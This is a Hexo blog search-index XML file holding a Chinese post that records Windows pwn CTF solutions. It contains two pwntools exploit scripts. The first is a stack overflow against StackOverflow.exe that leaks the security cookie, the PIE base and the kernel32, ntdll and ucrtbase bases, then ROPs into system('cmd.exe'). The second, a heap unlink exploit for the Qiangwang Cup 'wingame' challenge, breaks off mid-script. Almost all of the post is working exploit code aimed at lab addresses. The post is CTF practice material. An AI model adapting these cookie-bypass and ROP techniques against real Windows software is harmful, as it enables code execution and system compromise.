<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Windows_pwn_记录</title>
      <link href="/2021/05/23/windows-pwn-ji-lu/"/>
      <url>/2021/05/23/windows-pwn-ji-lu/</url>
      
        <content type="html"><![CDATA[<p>贴一个我蠢到家的exp  题目 StackOverflow.exe</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Time    : 2021-05-19 16:28</span><span class="token comment" spellcheck="true"># @Author  : H01K</span><span class="token comment" spellcheck="true"># @Email   : 49335564@qq.com</span><span class="token comment" spellcheck="true"># @File    : exp3.py</span><span class="token comment" spellcheck="true"># @Software: PyCharm</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">33855</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"buffer:\x0D\x0A"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>cookie <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'cookie:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 下面泄露pie</span><span class="token comment" spellcheck="true"># p.recvuntil('input:')</span><span class="token comment" spellcheck="true"># p.send('a'*0x118)</span><span class="token comment" spellcheck="true"># p.recvuntil("buffer:\x0D\x0A")</span><span class="token comment" spellcheck="true"># p.recv(0x118)</span><span class="token comment" spellcheck="true"># pie = u64(p.recv(6).ljust(8,'\x00')) - 0x2f4</span><span class="token comment" spellcheck="true"># log.success('pie:'+hex(pie))</span>pie <span class="token operator">=</span> <span class="token number">0x7ff6f40d0000</span>security_cookie_adr <span class="token operator">=</span> pie <span class="token operator">+</span> <span class="token number">0x3008</span>main_addr <span class="token operator">=</span> pie <span class="token operator">+</span> <span class="token number">0x1000</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x110</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"buffer:\x0D\x0A"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span>ebp_value <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'ebp_value:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>ebp_value<span class="token punctuation">)</span><span class="token punctuation">)</span>payload_ret_main <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x100</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ebp_value<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_addr <span class="token operator">+</span> <span class="token number">0x2EF</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_ret_main<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"buffer:\x0D\x0A"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x158</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"buffer:\x0D\x0A"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x158</span><span class="token punctuation">)</span>kernel32_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x17034</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'kernel32_base:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>kernel32_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># kernel32_base = 0x7ffbf6950000</span><span class="token comment" spellcheck="true"># log.success('kernel32_base:'+hex(kernel32_base))</span><span class="token comment" spellcheck="true"># ucrtbase = kernel32_base - 0x2390000 # 这里不对 ucrtbase 不能先泄露出来</span><span class="token comment" spellcheck="true"># log.success('ucrtbase:'+hex(ucrtbase))</span><span class="token comment" spellcheck="true"># put_addr = ucrtbase+ 0x83D50</span><span class="token comment" spellcheck="true"># log.success('put_addr:'+hex(put_addr))#00007FFEB9193D50</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x188</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"buffer:\x0D\x0A"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x188</span><span class="token punctuation">)</span>ntdll_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x52651</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'ntdll_base:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>ntdll_base<span class="token punctuation">)</span><span class="token punctuation">)</span>p_rcx <span class="token operator">=</span> <span class="token number">0xA115E</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x100</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ntdll_base <span class="token operator">+</span> p_rcx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>security_cookie_adr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pie<span class="token operator">+</span><span class="token number">0x107B</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 利用puts 输出puts的地址 p64(0) 是循环ebx的值</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"buffer:\x0D\x0A"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>security_cookie_value <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'security_cookie_value:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>security_cookie_value<span class="token punctuation">)</span><span class="token punctuation">)</span>old_rsp <span class="token operator">=</span> cookie<span class="token operator">^</span> security_cookie_valuelog<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'old_rsp:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>old_rsp<span class="token punctuation">)</span><span class="token punctuation">)</span>new_rsp <span class="token operator">=</span>old_rsp <span class="token operator">+</span>  <span class="token number">0x150</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'new_rsp:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>new_rsp<span class="token punctuation">)</span><span class="token punctuation">)</span>new_security_cookie_value <span class="token operator">=</span> new_rsp<span class="token operator">^</span>security_cookie_valuelog<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'new_security_cookie_value:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>new_rsp<span class="token operator">^</span>security_cookie_value<span class="token punctuation">)</span><span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x100</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>new_security_cookie_value<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ntdll_base <span class="token operator">+</span> p_rcx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pie<span class="token operator">+</span><span class="token number">0x2180</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pie<span class="token operator">+</span><span class="token number">0x107B</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 利用puts 输出puts的地址 p64(0) 是循环ebx的值</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"buffer:\x0D\x0A"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>put_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'put_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>put_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>new_rsp <span class="token operator">=</span>new_rsp <span class="token operator">+</span>  <span class="token number">0x150</span>ucrt_base <span class="token operator">=</span> put_addr <span class="token operator">-</span> <span class="token number">0x83D50</span>system <span class="token operator">=</span> ucrt_base <span class="token operator">+</span> <span class="token number">0xAE32C</span>cmd_exe <span class="token operator">=</span> ucrt_base <span class="token operator">+</span> <span class="token number">0xD0CB0</span>new_security_cookie_value <span class="token operator">=</span> new_rsp<span class="token operator">^</span>security_cookie_valuelog<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'new_security_cookie_value:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>new_rsp<span class="token operator">^</span>security_cookie_value<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x100</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>new_security_cookie_value<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ntdll_base <span class="token operator">+</span> p_rcx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cmd_exe<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ntdll_base <span class="token operator">+</span> <span class="token number">0x132c</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"buffer:\x0D\x0A"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>强网杯 线上赛  wingame</p><p>环境是 win7  因为 win10 有LFH  所以由干扰</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Time    : 2021-05-24 19:40</span><span class="token comment" spellcheck="true"># @Author  : H01K</span><span class="token comment" spellcheck="true"># @Email   : 49335564@qq.com</span><span class="token comment" spellcheck="true"># @File    : exp5.py</span><span class="token comment" spellcheck="true"># @Software: PyCharm</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> syscontext<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'i386'</span><span class="token comment" spellcheck="true"># context.log_level = 'debug'</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"192.168.15.130"</span><span class="token punctuation">,</span><span class="token number">33688</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span> data<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>str<span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span> data<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>str<span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>r <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>rg <span class="token operator">=</span> <span class="token keyword">lambda</span> regex<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvregex<span class="token punctuation">(</span>regex<span class="token punctuation">)</span>rp <span class="token operator">=</span> <span class="token keyword">lambda</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvrepeat<span class="token punctuation">(</span>timeout<span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>lg <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span> addr<span class="token punctuation">:</span> p<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m%20s--> 0x%x\033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>ls <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span> addr<span class="token punctuation">:</span> p<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m%20s--> %s\033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>ga <span class="token operator">=</span> <span class="token keyword">lambda</span> job<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> job<span class="token punctuation">)</span>ia <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'Command: '</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span>note<span class="token punctuation">)</span><span class="token punctuation">:</span>    ru<span class="token punctuation">(</span><span class="token string">'Command: '</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">'Note size:'</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>length<span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">'Note:'</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>note<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    ru<span class="token punctuation">(</span><span class="token string">'Command: '</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">'Note index:'</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>idx<span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">'Success!'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>note<span class="token punctuation">)</span><span class="token punctuation">:</span>    ru<span class="token punctuation">(</span><span class="token string">'Command: '</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">'Note index:'</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>idx<span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">'New note:'</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>note<span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">'Success!'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Encourage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ru<span class="token punctuation">(</span><span class="token string">'Command: '</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">'Which encouragement do you want to get? [0/1]'</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">'Success!'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># ru('Command: ')</span>    <span class="token comment" spellcheck="true"># sl(4)</span>    <span class="token comment" spellcheck="true"># ru('Which encouragement do you want to get? [0/1]')</span>    <span class="token comment" spellcheck="true"># sl(0)</span>    <span class="token comment" spellcheck="true"># ru('Success!')</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#获得一个位置 放置产生的多余堆块</span>Encourage<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token string">"0"</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x108</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x108</span><span class="token operator">+</span><span class="token string">"\x40\x01\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># show</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    ru<span class="token punctuation">(</span><span class="token string">'Command: '</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># pause()</span>    ru<span class="token punctuation">(</span><span class="token string">'Which encouragement do you want to show? [0/1]'</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">'So, which one do you want to show:'</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>idx<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">131</span><span class="token punctuation">)</span>pie <span class="token operator">=</span> uu32<span class="token punctuation">(</span><span class="token string">"\0\0"</span> <span class="token operator">+</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">"pie"</span><span class="token punctuation">,</span>pie<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">132</span><span class="token punctuation">)</span>t <span class="token operator">=</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">133</span><span class="token punctuation">)</span>t2 <span class="token operator">=</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span>key <span class="token operator">=</span> t <span class="token operator">+</span> t2ls<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">,</span>key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'Command: '</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">"Secret:"</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show2</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    ru<span class="token punctuation">(</span><span class="token string">'Command: '</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">'Note index:'</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>idx<span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">'Note:'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">## 构造unlink</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span>chunk_addr <span class="token operator">=</span> pie <span class="token operator">+</span> <span class="token number">0x64D8</span>Delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>chunk_addr <span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>chunk_addr <span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>Delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>chunk_addr <span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pie <span class="token operator">+</span> <span class="token number">0x40C4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token 